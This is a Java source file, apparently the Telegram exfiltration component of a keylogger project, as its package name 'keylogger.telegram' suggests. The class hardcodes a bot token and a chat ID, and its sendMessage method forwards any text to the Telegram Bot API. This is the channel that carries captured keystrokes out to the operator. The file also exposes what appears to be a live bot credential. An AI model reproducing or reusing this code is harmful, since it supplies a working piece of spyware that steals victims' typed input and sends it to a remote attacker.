package com.schnarre.keylogger.telegram;

import lombok.Getter;

import java.net.URL;
import java.util.List;
import java.util.Properties;

/**
 * Created by IntelliJ IDEA
 * User: schnarrenils
 * Date: 05.01.2023
 * Time: 17:42
 */

public class TelegramManager {
    @Getter
    private static String token = "5987218333:AAFE-BI3o0qQ7uQtr-chbD5Mmeh2I5A38ZQ";
    @Getter
    private static int chatId = -889436339;

    public void sendMessage(String message) {
        try {
            new URL("https://api.telegram.org/bot" + TelegramManager.getToken() + "/sendMessage?chat_id=" + TelegramManager.getChatId() + "&text=" + message).openStream().close();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

}
